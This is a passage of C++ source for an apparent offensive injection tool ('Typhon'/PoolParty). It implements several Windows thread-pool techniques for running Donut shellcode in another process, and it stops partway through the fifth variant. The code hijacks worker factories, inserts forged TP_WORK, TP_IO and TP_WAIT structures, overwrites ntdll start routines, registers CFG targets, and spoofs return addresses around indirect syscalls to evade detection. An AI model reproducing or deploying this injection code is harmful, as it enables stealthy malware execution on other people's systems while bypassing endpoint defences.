// ============================================================================
// Typhon — All 8 Thread Pool Execution Primitives + Dispatcher
// ============================================================================
// Each variant implements a different execution trigger for the target's
// thread pool. All share section-backed memory injection and indirect syscalls.
//
// No IAT entries. No GetProcAddress. No VirtualAllocEx. No WriteProcessMemory.
// No CreateRemoteThread. No NtQueueApcThread. No SetThreadContext.
// ============================================================================

#include "variants.h"
#include "tartarus.h"
#include "syscall_manager.h"
#include "call_context.h"
#include "peb_lookup.h"
#include "hashing.h"
#include "config.h"
#include "prng.h"
#include "crypto.h"

namespace PoolParty {

    // ========================================================================
    // Shared helpers
    // ========================================================================

    static inline void SpoofBegin() {
        CallContext::g_spoof_ret   = CallContext::GetLegitimateReturnAddress();
        CallContext::g_proxy_frame = nullptr;
    }

    static inline void SpoofEnd() {
        CallContext::g_spoof_ret   = nullptr;
        CallContext::g_proxy_frame = nullptr;
    }

    static NTSTATUS SyscallInvoke(uint32_t apiHash, ULONG_PTR a1 = 0, ULONG_PTR a2 = 0,
                                   ULONG_PTR a3 = 0, ULONG_PTR a4 = 0, ULONG_PTR a5 = 0,
                                   ULONG_PTR a6 = 0, ULONG_PTR a7 = 0, ULONG_PTR a8 = 0,
                                   ULONG_PTR a9 = 0, ULONG_PTR a10 = 0, ULONG_PTR a11 = 0) {
        const Tartarus::SyscallEntry* entry = Tartarus::GetSyscall(apiHash);
        if (!entry) return (NTSTATUS)0xC0000001L;
        SpoofBegin();
        NTSTATUS status = DoSyscallSpoofed(
            entry->Ssn, SyscallManager::GetRandomTrampoline(),
            a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11);
        SpoofEnd();
        return status;
    }

    // CreateThread trampoline - spawns shellcode in a new thread so the
    // thread pool worker returns cleanly. Donut shellcode calls ExitThread
    // when done, which would kill the worker if called directly.
    //
    // IDEMPOTENT: Uses lock cmpxchg to ensure only the first caller runs
    // CreateThread. Subsequent callers (from multiple workers hitting the
    // JMP stub) just return 0 without spawning duplicate shellcode.
    //
    // Trampoline lives in PRIVATE memory (NtAllocateVirtualMemory) so we
    // can register it as a valid CFG call target. Shellcode lives in a
    // section-backed mapping (RWX for donut self-decryption).
    static const SIZE_T TRAMPOLINE_SIZE = 128;

    static bool BuildTrampoline(uint8_t* buf, SIZE_T bufSize,
                                 PVOID pCreateThread, PVOID pShellcode) {
        if (bufSize < TRAMPOLINE_SIZE) return false;
        for (SIZE_T i = 0; i < TRAMPOLINE_SIZE; i++) buf[i] = 0xCC;

        // Layout:
        //   [0x00..code_end]  = executable code
        //   [0x70]            = guard flag (DWORD, initially 0)
        //
        // Guard: lock cmpxchg [rip+flag_offset], ecx
        //   If old value was 0 (first caller): ZF=1, proceed to CreateThread
        //   If old value was 1 (already ran):  ZF=0, skip to return 0

        const int FLAG_OFFSET = 0x70;  // Guard flag at byte 0x70 in the buffer

        int p = 0;

        // sub rsp, 38h
        buf[p++]=0x48; buf[p++]=0x83; buf[p++]=0xEC; buf[p++]=0x38;

        // --- Interlocked guard: only first caller proceeds ---
        // xor eax, eax          ; expected old value = 0
        buf[p++]=0x31; buf[p++]=0xC0;
        // mov ecx, 1            ; new value = 1
        buf[p++]=0xB9; buf[p++]=0x01; buf[p++]=0x00; buf[p++]=0x00; buf[p++]=0x00;

        // lock cmpxchg [rip + disp32], ecx
        // Encoding: F0 0F B1 0D <disp32>
        // disp32 = FLAG_OFFSET - (current_rip_after_instruction)
        // Instruction is 8 bytes: F0(1) + 0F B1(2) + 0D(1) + disp32(4) = 8
        // RIP after instruction = cmpxchg_pos + 8
        int cmpxchg_pos = p;
        buf[p++]=0xF0; buf[p++]=0x0F; buf[p++]=0xB1; buf[p++]=0x0D;
        int32_t disp = FLAG_OFFSET - (cmpxchg_pos + 8);
        buf[p++]=(uint8_t)(disp & 0xFF);
        buf[p++]=(uint8_t)((disp >> 8) & 0xFF);
        buf[p++]=(uint8_t)((disp >> 16) & 0xFF);
        buf[p++]=(uint8_t)((disp >> 24) & 0xFF);

        // jne skip_create  (ZF=0 means flag was already 1)
        // We'll patch the offset after we know where skip_create is
        int jne_pos = p;
        buf[p++]=0x75; buf[p++]=0x00;  // placeholder offset

        // --- First caller: call CreateThread(NULL, 0, shellcode, NULL, 0, NULL) ---
        // mov r8, <shellcode address>
        uint64_t scAddr = (uint64_t)pShellcode;
        buf[p++]=0x49; buf[p++]=0xB8;
        for (int i=0;i<8;i++) buf[p++]=(uint8_t)((scAddr>>(i*8))&0xFF);
        // xor ecx, ecx
        buf[p++]=0x31; buf[p++]=0xC9;
        // xor edx, edx
        buf[p++]=0x31; buf[p++]=0xD2;
        // xor r9d, r9d
        buf[p++]=0x45; buf[p++]=0x31; buf[p++]=0xC9;
        // mov qword [rsp+20h], 0
        buf[p++]=0x48; buf[p++]=0xC7; buf[p++]=0x44; buf[p++]=0x24;
        buf[p++]=0x20; buf[p++]=0x00; buf[p++]=0x00; buf[p++]=0x00; buf[p++]=0x00;
        // mov qword [rsp+28h], 0
        buf[p++]=0x48; buf[p++]=0xC7; buf[p++]=0x44; buf[p++]=0x24;
        buf[p++]=0x28; buf[p++]=0x00; buf[p++]=0x00; buf[p++]=0x00; buf[p++]=0x00;
        // mov rax, <CreateThread>
        uint64_t ctAddr = (uint64_t)pCreateThread;
        buf[p++]=0x48; buf[p++]=0xB8;
        for (int i=0;i<8;i++) buf[p++]=(uint8_t)((ctAddr>>(i*8))&0xFF);
        // call rax
        buf[p++]=0xFF; buf[p++]=0xD0;

        // skip_create:
        int skip_target = p;
        buf[jne_pos + 1] = (uint8_t)(skip_target - (jne_pos + 2));  // patch JNE offset

        // xor eax, eax  (return 0)
        buf[p++]=0x31; buf[p++]=0xC0;
        // add rsp, 38h
        buf[p++]=0x48; buf[p++]=0x83; buf[p++]=0xC4; buf[p++]=0x38;
        // ret
        buf[p++]=0xC3;

        // Ensure guard flag is 0
        *(uint32_t*)(buf + FLAG_OFFSET) = 0;

        return true;
    }

    static PVOID InjectShellcodeSection(HANDLE targetProcess,
                                         PVOID shellcode, SIZE_T shellcodeSize,
                                         MemoryWriter::SharedMapping& outMapping) {
        HMODULE hK32 = Resolver::GetModuleByHash(HASH_MODULE(L"kernel32.dll"));
        PVOID pCT = hK32 ? Resolver::GetExportByHash(hK32, HASH_API("CreateThread")) : nullptr;
        if (!pCT) { LOG_ERROR("Variants: Failed to resolve CreateThread"); return nullptr; }

        // 1. Map shellcode into target via section (RWX for donut decryption)
        outMapping = MemoryWriter::CreateSharedMapping(
            targetProcess, shellcodeSize,
            PAGE_READWRITE, PAGE_EXECUTE_READWRITE
        );
        if (!outMapping.success) {
            LOG_ERROR("Variants: Failed to create shellcode section");
            return nullptr;
        }
        if (!MemoryWriter::WriteThrough(outMapping, shellcode, shellcodeSize, 0)) {
            LOG_ERROR("Variants: Failed to write shellcode");
            MemoryWriter::Destroy(outMapping, targetProcess);
            return nullptr;
        }
        MemoryWriter::DetachLocal(outMapping);
        PVOID remoteShellcode = outMapping.remoteView;

        // 2. Allocate private RW page in target for trampoline via VirtualAllocEx
        //    Using kernel32 API because VirtualAllocEx properly initializes
        //    CFG bitmap entries for the new allocation.
        typedef LPVOID(WINAPI* VirtualAllocEx_t)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
        typedef BOOL(WINAPI* VirtualProtectEx_t)(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);
        VirtualAllocEx_t pVAEx = (VirtualAllocEx_t)Resolver::GetExportByHash(hK32, HASH_API("VirtualAllocEx"));
        VirtualProtectEx_t pVPEx = (VirtualProtectEx_t)Resolver::GetExportByHash(hK32, HASH_API("VirtualProtectEx"));
        if (!pVAEx || !pVPEx) { LOG_ERROR("Variants: Missing VirtualAllocEx/VirtualProtectEx"); return nullptr; }

        SIZE_T trampolineAllocSize = 0x1000;
        PVOID trampolineAddr = pVAEx(targetProcess, nullptr, trampolineAllocSize,
                                      MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!trampolineAddr) {
            LOG_ERROR("Variants: VirtualAllocEx for trampoline failed");
            return nullptr;
        }

        // 3. Build trampoline with absolute shellcode address
        uint8_t trampBuf[TRAMPOLINE_SIZE] = {};
        if (!BuildTrampoline(trampBuf, sizeof(trampBuf), pCT, remoteShellcode)) return nullptr;

        // 4. Write trampoline to target's private page
        if (!MemoryWriter::RemoteWrite(targetProcess, trampolineAddr, trampBuf, TRAMPOLINE_SIZE)) {
            LOG_ERROR("Variants: Failed to write trampoline to target");
            return nullptr;
        }

        // 5. Change trampoline page from RW to RWX
        {
            DWORD oldProtect = 0;
            BOOL protOk = pVPEx(targetProcess, trampolineAddr, trampolineAllocSize,
                                PAGE_EXECUTE_READWRITE, &oldProtect);
            if (protOk) {
                LOG("Variants: Trampoline page changed to PAGE_EXECUTE_READWRITE");
            } else {
                LOG("Variants: VirtualProtectEx failed (continuing with RW)");
            }
        }

        // 6. Register trampoline as valid CFG call target via SetProcessValidCallTargets
        {
            typedef BOOL(WINAPI* SetProcessValidCallTargets_t)(
                HANDLE hProcess, PVOID VirtualAddress, SIZE_T RegionSize,
                ULONG NumberOfOffsets, CFG_CALL_TARGET_INFO* OffsetInformation);

            HMODULE hKB = Resolver::GetModuleByHash(HASH_MODULE(L"kernelbase.dll"));
            SetProcessValidCallTargets_t pSetCFG = hKB ?
                (SetProcessValidCallTargets_t)Resolver::GetExportByHash(hKB, HASH_API("SetProcessValidCallTargets")) : nullptr;

            if (pSetCFG) {
                CFG_CALL_TARGET_INFO cfgTarget = {};
                cfgTarget.Offset = 0;
                cfgTarget.Flags  = CFG_CALL_TARGET_VALID;

                BOOL cfgOk = pSetCFG(targetProcess, trampolineAddr, trampolineAllocSize, 1, &cfgTarget);
                if (cfgOk) {
                    LOG_SUCCESS("Variants: CFG target registered @ %p", trampolineAddr);
                } else {
                    LOG("Variants: SetProcessValidCallTargets failed (target may not use CFG)");
                }
            } else {
                LOG("Variants: SetProcessValidCallTargets not found (older OS?)");
            }
        }
        LOG_SUCCESS("Variants: Trampoline @ %p -> Shellcode @ %p (%zu bytes)",
            trampolineAddr, remoteShellcode, shellcodeSize);
        return trampolineAddr;
    }

    // Shared: inject a data structure into target via section-backed mapping
    // Returns the remote address of the structure (RW in target)
    static PVOID InjectStructure(HANDLE targetProcess, const void* data, SIZE_T size,
                                  MemoryWriter::SharedMapping& outMapping) {
        outMapping = MemoryWriter::CreateSharedMapping(
            targetProcess, size,
            PAGE_READWRITE, PAGE_READWRITE
        );

        if (!outMapping.success) return nullptr;

        if (!MemoryWriter::WriteThrough(outMapping, data, size)) {
            MemoryWriter::Destroy(outMapping, targetProcess);
            return nullptr;
        }

        MemoryWriter::DetachLocal(outMapping);
        return outMapping.remoteView;
    }

    // ========================================================================
    // Variant 1: Worker Factory Start Routine Overwrite
    // ========================================================================
    // DESTRUCTIVE — overwrites TppWorkerThread, breaks the thread pool.
    // Best for one-shot execution where target stability doesn't matter.

    namespace V1_WorkerFactory {
        InjectResult Execute(HANDLE targetProcess,
                             HandleHijack::HijackedHandles& handles,
                             PVOID shellcode, SIZE_T shellcodeSize) {
            InjectResult result = {};
            result.VariantUsed = VARIANT_WORKER_FACTORY;

            if (!handles.WorkerFactory || !handles.StartRoutine) {
                LOG_ERROR("V1: No worker factory handle or start routine");
                return result;
            }

            result.HandleHijackOk = true;

            // Inject shellcode via section-backed mapping (RWX for donut)
            MemoryWriter::SharedMapping scMapping = {};
            PVOID remoteTrampoline = InjectShellcodeSection(targetProcess, shellcode,
                                                             shellcodeSize, scMapping);
            if (!remoteTrampoline) {
                LOG_ERROR("V1: Failed to inject shellcode section");
                return result;
            }
            result.ShellcodeAddress = remoteTrampoline;

            // Build a small JMP stub: mov rax, <trampoline>; jmp rax
            // remoteTrampoline is the CreateThread trampoline from InjectShellcodeSection
            uint8_t jmpStub[14] = {};
            uint64_t tAddr = (uint64_t)remoteTrampoline;
            jmpStub[0] = 0x48; jmpStub[1] = 0xB8;
            for (int i = 0; i < 8; i++) jmpStub[2 + i] = (uint8_t)((tAddr >> (i * 8)) & 0xFF);
            jmpStub[10] = 0xFF; jmpStub[11] = 0xE0;
            jmpStub[12] = 0x90; jmpStub[13] = 0x90;

            // Change ntdll page protection to RWX
            typedef BOOL(WINAPI* VirtualProtectEx_t)(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);
            HMODULE hK32 = Resolver::GetModuleByHash(HASH_MODULE(L"kernel32.dll"));
            VirtualProtectEx_t pVPEx = hK32 ?
                (VirtualProtectEx_t)Resolver::GetExportByHash(hK32, HASH_API("VirtualProtectEx")) : nullptr;

            if (!pVPEx) {
                LOG_ERROR("V1: VirtualProtectEx not found");
                return result;
            }

            DWORD oldProtect = 0;
            BOOL protOk = pVPEx(targetProcess, handles.StartRoutine, (SIZE_T)sizeof(jmpStub),
                                PAGE_EXECUTE_READWRITE, &oldProtect);
            if (!protOk) {
                LOG_ERROR("V1: VirtualProtectEx failed on start routine @ %p", handles.StartRoutine);
                return result;
            }
            LOG("V1: Start routine page changed to RWX (was 0x%X)", oldProtect);

            // Write JMP stub over TppWorkerThread
            if (!MemoryWriter::RemoteWrite(targetProcess, handles.StartRoutine,
                                            jmpStub, sizeof(jmpStub))) {
                LOG_ERROR("V1: Failed to write JMP stub @ %p", handles.StartRoutine);
                pVPEx(targetProcess, handles.StartRoutine, (SIZE_T)sizeof(jmpStub), oldProtect, &oldProtect);
                return result;
            }

            result.MemoryWriteOk = true;

            // Re-query worker factory for current state (may have changed since hijack)
            WORKER_FACTORY_BASIC_INFORMATION wfInfo = {};
            ULONG wfRetLen = 0;
            SyscallInvoke(
                HASH_API("NtQueryInformationWorkerFactory"),
                (ULONG_PTR)handles.WorkerFactory,
                (ULONG_PTR)WorkerFactoryBasicInformation,
                (ULONG_PTR)&wfInfo,
                (ULONG_PTR)sizeof(wfInfo),
                (ULONG_PTR)&wfRetLen
            );
            LOG("V1: Current workers: total=%u, min=%u, max=%u",
                wfInfo.TotalWorkerCount, wfInfo.MinimumWorkerCount, wfInfo.MaximumWorkerCount);

            // Force creation of new worker thread(s).
            // The trampoline is idempotent (lock cmpxchg guard), so even if
            // multiple workers are created, only the first one runs CreateThread.
            NTSTATUS status = STATUS_SUCCESS;

            // Verify JMP stub was written correctly by reading it back
            {
                uint8_t readback[14] = {};
                if (MemoryWriter::RemoteRead(targetProcess, handles.StartRoutine, readback, sizeof(readback))) {
                    bool match = true;
                    for (int i = 0; i < 14; i++) {
                        if (readback[i] != jmpStub[i]) { match = false; break; }
                    }
                    if (match) {
                        LOG_SUCCESS("V1: JMP stub verified at %p", handles.StartRoutine);
                    } else {
                        LOG_ERROR("V1: JMP stub MISMATCH at %p!", handles.StartRoutine);
                        LOG_HEX("Expected", jmpStub, 14);
                        LOG_HEX("Got", readback, 14);
                    }
                } else {
                    LOG_ERROR("V1: Failed to read back JMP stub");
                }
            }

            // Queue a dummy I/O completion packet to provide work
            if (handles.IoCompletion) {
                NTSTATUS ioStatus = SyscallInvoke(
                    HASH_API("NtSetIoCompletion"),
                    (ULONG_PTR)handles.IoCompletion,
                    (ULONG_PTR)nullptr,
                    (ULONG_PTR)nullptr,
                    (ULONG_PTR)STATUS_SUCCESS,
                    (ULONG_PTR)0
                );
                LOG("V1: NtSetIoCompletion (wake) = 0x%08X", ioStatus);
            }

            // Bump minimum to force worker creation.
            // The trampoline's lock cmpxchg guard ensures only one copy of
            // shellcode runs, even if multiple workers are created.
            {
                ULONG newMinimum = wfInfo.TotalWorkerCount + 1;
                if (newMinimum <= wfInfo.MinimumWorkerCount) {
                    newMinimum = wfInfo.MinimumWorkerCount + 1;
                }
                status = SyscallInvoke(
                    HASH_API("NtSetInformationWorkerFactory"),
                    (ULONG_PTR)handles.WorkerFactory,
                    (ULONG_PTR)WorkerFactoryThreadMinimum,
                    (ULONG_PTR)&newMinimum,
                    (ULONG_PTR)sizeof(ULONG)
                );
                LOG("V1: NtSetInformationWorkerFactory(min=%u) = 0x%08X", newMinimum, status);
            }

            result.ExecutionTriggerOk = true;
            result.Success = true;

            LOG_SUCCESS("V1: Start routine @ %p overwritten with JMP to trampoline @ %p",
                handles.StartRoutine, remoteTrampoline);

            return result;
        }
    }

    // ========================================================================
    // Variant 2: Remote TP_WORK Insertion (Task Queue)
    // ========================================================================
    // Crafts a TP_WORK and links it into the task queue's doubly-linked list.
    // Requires reading TP_POOL to find the task queue head, then patching
    // the Flink/Blink pointers to insert our entry.

    namespace V2_TpWork {
        InjectResult Execute(HANDLE targetProcess,
                             HandleHijack::HijackedHandles& handles,
                             PVOID shellcode, SIZE_T shellcodeSize) {
            InjectResult result = {};
            result.VariantUsed = VARIANT_TP_WORK;

            if (!handles.WorkerFactory || !handles.TpPoolAddress) {
                LOG_ERROR("V2: No worker factory or TP_POOL address");
                return result;
            }

            result.HandleHijackOk = true;

            // Inject shellcode via section
            MemoryWriter::SharedMapping scMapping = {};
            PVOID remoteShellcode = InjectShellcodeSection(targetProcess, shellcode,
                                                            shellcodeSize, scMapping);
            if (!remoteShellcode) return result;

            result.ShellcodeAddress = remoteShellcode;

            // Read the TP_POOL to find the task queue head
            // The task queue is a LIST_ENTRY at a known offset in TP_POOL
            // We read the first 0x100 bytes to find it
            BYTE poolData[0x100] = {};
            if (!MemoryWriter::RemoteRead(targetProcess, handles.TpPoolAddress, poolData, sizeof(poolData))) {
                LOG_ERROR("V2: Failed to read TP_POOL");
                return result;
            }

            // The task queue LIST_ENTRY is at offset 0x10 in TP_POOL (approximate)
            // We scan for a self-referencing LIST_ENTRY (empty queue: Flink == Blink == &Head)
            PVOID taskQueueHead = nullptr;
            SIZE_T taskQueueOffset = 0;

            for (SIZE_T off = 0x08; off < 0xF0; off += 8) {
                PVOID flink = *(PVOID*)(poolData + off);
                PVOID blink = *(PVOID*)(poolData + off + 8);
                PVOID expectedSelf = (BYTE*)handles.TpPoolAddress + off;

                // Empty queue: both point to the head itself
                if (flink == expectedSelf && blink == expectedSelf) {
                    taskQueueHead = expectedSelf;
                    taskQueueOffset = off;
                    break;
                }
                // Non-empty queue: Flink points somewhere else, but we can still use it
                // by checking if the pointer looks like a valid usermode address
                if (flink != nullptr && blink != nullptr &&
                    (ULONG_PTR)flink > 0x10000 && (ULONG_PTR)flink < 0x7FFFFFFFFFFF &&
                    (ULONG_PTR)blink > 0x10000 && (ULONG_PTR)blink < 0x7FFFFFFFFFFF &&
                    flink != blink) {
                    // Could be a non-empty queue — check if Flink->Blink == Head
                    PVOID flinkBlink = nullptr;
                    if (MemoryWriter::RemoteRead(targetProcess, (BYTE*)flink + 8, &flinkBlink, 8)) {
                        if (flinkBlink == expectedSelf) {
                            taskQueueHead = expectedSelf;
                            taskQueueOffset = off;
                            break;
                        }
                    }
                }
            }

            if (!taskQueueHead) {
                LOG_ERROR("V2: Could not locate task queue in TP_POOL");
                return result;
            }

            LOG("V2: Task queue head @ %p (offset 0x%zX in TP_POOL)", taskQueueHead, taskQueueOffset);

            // Craft TP_WORK structure
            TP_WORK tpWork = {};
            tpWork.CleanupGroupMember.Callback = remoteShellcode;
            tpWork.CleanupGroupMember.Pool = handles.TpPoolAddress;
            tpWork.CleanupGroupMember.RefCount = 1;
            tpWork.WorkState = 0x2;  // Queued state

            // The Task.ListEntry will be patched after we know the remote address
            // For now, set it to point to the queue head (will be updated)

            // Inject TP_WORK structure
            MemoryWriter::SharedMapping workMapping = {};
            PVOID remoteWork = InjectStructure(targetProcess, &tpWork, sizeof(tpWork), workMapping);
            if (!remoteWork) {
                LOG_ERROR("V2: Failed to inject TP_WORK");
                return result;
            }

            result.StructureAddress = remoteWork;

            // Calculate the address of Task.ListEntry in the remote TP_WORK
            PVOID remoteListEntry = (BYTE*)remoteWork + offsetof(TP_WORK, Task) + offsetof(TP_TASK, ListEntry);

            // Read current queue head Flink
            PVOID currentFlink = nullptr;
            MemoryWriter::RemoteRead(targetProcess, taskQueueHead, &currentFlink, sizeof(PVOID));

            // Patch our ListEntry: Flink = old head Flink, Blink = queue head
            LIST_ENTRY newEntry;
            newEntry.Flink = (PLIST_ENTRY)currentFlink;
            newEntry.Blink = (PLIST_ENTRY)taskQueueHead;

            if (!MemoryWriter::RemoteWrite(targetProcess, remoteListEntry, &newEntry, sizeof(LIST_ENTRY))) {
                LOG_ERROR("V2: Failed to patch ListEntry");
                return result;
            }

            // Patch queue head Flink to point to our entry
            if (!MemoryWriter::RemoteWrite(targetProcess, taskQueueHead, &remoteListEntry, sizeof(PVOID))) {
                LOG_ERROR("V2: Failed to patch queue head Flink");
                return result;
            }

            // Patch old first entry's Blink to point to our entry
            if (currentFlink && currentFlink != taskQueueHead) {
                PVOID oldBlink = (BYTE*)currentFlink + sizeof(PVOID); // Blink is second field
                MemoryWriter::RemoteWrite(targetProcess, oldBlink, &remoteListEntry, sizeof(PVOID));
            } else {
                // Queue was empty — patch head's Blink too
                PVOID headBlink = (BYTE*)taskQueueHead + sizeof(PVOID);
                MemoryWriter::RemoteWrite(targetProcess, headBlink, &remoteListEntry, sizeof(PVOID));
            }

            result.MemoryWriteOk = true;
            result.ExecutionTriggerOk = true;
            result.Success = true;

            LOG_SUCCESS("V2: TP_WORK inserted into task queue @ %p", remoteWork);
            return result;
        }
    }

    // ========================================================================
    // Variant 3: Remote TP_IO Insertion (I/O Completion via File)
    // ========================================================================
    // Associates a file with the target's I/O completion port, then triggers
    // a file write. The completion notification fires our callback.

    namespace V3_TpIo {
        InjectResult Execute(HANDLE targetProcess,
                             HandleHijack::HijackedHandles& handles,
                             PVOID shellcode, SIZE_T shellcodeSize) {
            InjectResult result = {};
            result.VariantUsed = VARIANT_TP_IO;

            if (!handles.IoCompletion) {
                LOG_ERROR("V3: No I/O completion handle");
                return result;
            }

            result.HandleHijackOk = true;

            // Inject shellcode
            MemoryWriter::SharedMapping scMapping = {};
            PVOID remoteShellcode = InjectShellcodeSection(targetProcess, shellcode,
                                                            shellcodeSize, scMapping);
            if (!remoteShellcode) return result;
            result.ShellcodeAddress = remoteShellcode;

            // Create TP_DIRECT with callback pointing to shellcode
            TP_DIRECT tpDirect = {};
            tpDirect.Callback = remoteShellcode;

            MemoryWriter::SharedMapping directMapping = {};
            PVOID remoteDirect = InjectStructure(targetProcess, &tpDirect, sizeof(tpDirect), directMapping);
            if (!remoteDirect) return result;
            result.StructureAddress = remoteDirect;
            result.MemoryWriteOk = true;

            // Create a temp file, associate it with target's I/O completion port
            // via NtSetInformationFile(FileReplaceCompletionInformation)
            // Then write to the file to trigger the completion

            // Resolve CreateFileW and WriteFile from kernel32 via PEB
            typedef HANDLE(WINAPI* CreateFileW_t)(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
            typedef BOOL(WINAPI* WriteFile_t)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
            typedef BOOL(WINAPI* CloseHandle_t)(HANDLE);
            typedef BOOL(WINAPI* DeleteFileW_t)(LPCWSTR);
            typedef DWORD(WINAPI* GetTempPathW_t)(DWORD, LPWSTR);

            HMODULE hK32 = Resolver::GetModuleByHash(HASH_MODULE(L"kernel32.dll"));
            if (!hK32) { LOG_ERROR("V3: No kernel32"); return result; }

            CreateFileW_t pCreateFile = (CreateFileW_t)Resolver::GetExportByHash(hK32, HASH_API("CreateFileW"));
            WriteFile_t pWriteFile = (WriteFile_t)Resolver::GetExportByHash(hK32, HASH_API("WriteFile"));
            CloseHandle_t pCloseHandle = (CloseHandle_t)Resolver::GetExportByHash(hK32, HASH_API("CloseHandle"));
            DeleteFileW_t pDeleteFile = (DeleteFileW_t)Resolver::GetExportByHash(hK32, HASH_API("DeleteFileW"));
            GetTempPathW_t pGetTempPath = (GetTempPathW_t)Resolver::GetExportByHash(hK32, HASH_API("GetTempPathW"));

            if (!pCreateFile || !pWriteFile || !pCloseHandle || !pDeleteFile || !pGetTempPath) {
                LOG_ERROR("V3: Failed to resolve file APIs");
                return result;
            }

            // Build temp file path
            WCHAR tempPath[MAX_PATH] = {};
            pGetTempPath(MAX_PATH, tempPath);

            // Append random filename
            WCHAR tempFile[MAX_PATH] = {};
            for (int i = 0; tempPath[i]; i++) tempFile[i] = tempPath[i];
            int len = 0;
            while (tempFile[len]) len++;

            // Random 8-char hex filename
            uint32_t rnd = Prng::Next32();
            const WCHAR hex[] = L"0123456789abcdef";
            for (int i = 0; i < 8; i++) {
                tempFile[len++] = hex[(rnd >> (i * 4)) & 0xF];
            }
            tempFile[len++] = L'.';
            tempFile[len++] = L't';
            tempFile[len++] = L'm';
            tempFile[len++] = L'p';
            tempFile[len] = 0;

            // Create file with FILE_FLAG_OVERLAPPED for async I/O
            HANDLE hFile = pCreateFile(tempFile, GENERIC_WRITE, 0, nullptr,
                                        CREATE_ALWAYS, FILE_FLAG_OVERLAPPED | FILE_FLAG_DELETE_ON_CLOSE, nullptr);
            if (hFile == INVALID_HANDLE_VALUE) {
                LOG_ERROR("V3: Failed to create temp file");
                return result;
            }

            // Associate file with target's I/O completion port
            FILE_COMPLETION_INFORMATION compInfo = {};
            compInfo.Port = handles.IoCompletion;
            compInfo.Key = remoteDirect;  // Completion key → our TP_DIRECT

            IO_STATUS_BLOCK iosb = {};
            NTSTATUS status = SyscallInvoke(
                HASH_API("NtSetInformationFile"),
                (ULONG_PTR)hFile,
                (ULONG_PTR)&iosb,
                (ULONG_PTR)&compInfo,
                (ULONG_PTR)sizeof(compInfo),
                (ULONG_PTR)FileReplaceCompletionInformation
            );

            if (!NT_SUCCESS(status)) {
                LOG_ERROR("V3: NtSetInformationFile failed: 0x%08X", status);
                pCloseHandle(hFile);
                pDeleteFile(tempFile);
                return result;
            }

            // Write to file — triggers I/O completion in target
            BYTE triggerData[16] = {};
            DWORD written = 0;
            OVERLAPPED ov = {};
            pWriteFile(hFile, triggerData, sizeof(triggerData), &written, &ov);

            // Cleanup file
            pCloseHandle(hFile);

            result.ExecutionTriggerOk = true;
            result.Success = true;

            LOG_SUCCESS("V3: TP_IO triggered via file write → %p", remoteDirect);
            return result;
        }
    }

    // ========================================================================
    // Variant 4: Remote TP_WAIT Insertion (Event)
    // ========================================================================
    // Creates a wait completion packet associated with the target's I/O
    // completion port, then signals an event to trigger execution.

    namespace V4_TpWait {
        InjectResult Execute(HANDLE targetProcess,
                             HandleHijack::HijackedHandles& handles,
                             PVOID shellcode, SIZE_T shellcodeSize) {
            InjectResult result = {};
            result.VariantUsed = VARIANT_TP_WAIT;

            if (!handles.IoCompletion) {
                LOG_ERROR("V4: No I/O completion handle");
                return result;
            }

            result.HandleHijackOk = true;

            // Inject shellcode
            MemoryWriter::SharedMapping scMapping = {};
            PVOID remoteShellcode = InjectShellcodeSection(targetProcess, shellcode,
                                                            shellcodeSize, scMapping);
            if (!remoteShellcode) return result;
            result.ShellcodeAddress = remoteShellcode;

            // Create TP_DIRECT
            TP_DIRECT tpDirect = {};
            tpDirect.Callback = remoteShellcode;

            MemoryWriter::SharedMapping directMapping = {};
            PVOID remoteDirect = InjectStructure(targetProcess, &tpDirect, sizeof(tpDirect), directMapping);
            if (!remoteDirect) return result;
            result.StructureAddress = remoteDirect;
            result.MemoryWriteOk = true;

            // Create an event
            HANDLE hEvent = nullptr;
            NTSTATUS status = SyscallInvoke(
                HASH_API("NtCreateEvent"),
                (ULONG_PTR)&hEvent,
                (ULONG_PTR)EVENT_ALL_ACCESS,
                (ULONG_PTR)nullptr,
                (ULONG_PTR)1,      // SynchronizationEvent
                (ULONG_PTR)FALSE   // Not initially signaled
            );

            if (!NT_SUCCESS(status) || !hEvent) {
                LOG_ERROR("V4: NtCreateEvent failed: 0x%08X", status);
                return result;
            }

            // Create wait completion packet
            HANDLE hWaitPacket = nullptr;
            status = SyscallInvoke(
                HASH_API("NtCreateWaitCompletionPacket"),
                (ULONG_PTR)&hWaitPacket,
                (ULONG_PTR)GENERIC_ALL,
                (ULONG_PTR)nullptr
            );

            if (!NT_SUCCESS(status) || !hWaitPacket) {
                LOG_ERROR("V4: NtCreateWaitCompletionPacket failed: 0x%08X", status);
                SyscallInvoke(HASH_API("NtClose"), (ULONG_PTR)hEvent);
                return result;
            }

            // Associate wait packet with target's I/O completion port
            BOOLEAN alreadySignaled = FALSE;
            status = SyscallInvoke(
                HASH_API("NtAssociateWaitCompletionPacket"),
                (ULONG_PTR)hWaitPacket,
                (ULONG_PTR)handles.IoCompletion,
                (ULONG_PTR)hEvent,
                (ULONG_PTR)remoteDirect,    // Key context → TP_DIRECT
                (ULONG_PTR)nullptr,
                (ULONG_PTR)STATUS_SUCCESS,
                (ULONG_PTR)0,
                (ULONG_PTR)&alreadySignaled
            );

            if (!NT_SUCCESS(status)) {
                LOG_ERROR("V4: NtAssociateWaitCompletionPacket failed: 0x%08X", status);
                SyscallInvoke(HASH_API("NtClose"), (ULONG_PTR)hWaitPacket);
                SyscallInvoke(HASH_API("NtClose"), (ULONG_PTR)hEvent);
                return result;
            }

            // Signal the event — triggers the wait completion packet
            status = SyscallInvoke(HASH_API("NtSetEvent"), (ULONG_PTR)hEvent, (ULONG_PTR)nullptr);

            // Cleanup handles
            SyscallInvoke(HASH_API("NtClose"), (ULONG_PTR)hWaitPacket);
            SyscallInvoke(HASH_API("NtClose"), (ULONG_PTR)hEvent);

            result.ExecutionTriggerOk = NT_SUCCESS(status);
            result.Success = result.ExecutionTriggerOk;

            LOG_SUCCESS("V4: TP_WAIT triggered via event signal → %p", remoteDirect);
            return result;
        }
    }

    // ========================================================================
    // Variant 5: Remote TP_ALPC Insertion (ALPC Message)
    // ========================================================================
    // Creates an ALPC port associated with the target's I/O completion port,
    // then sends a message to trigger the callback.

    namespace V5_TpAlpc {
        InjectResult Execute(HANDLE targetProcess,
                             HandleHijack::HijackedHandles& handles,
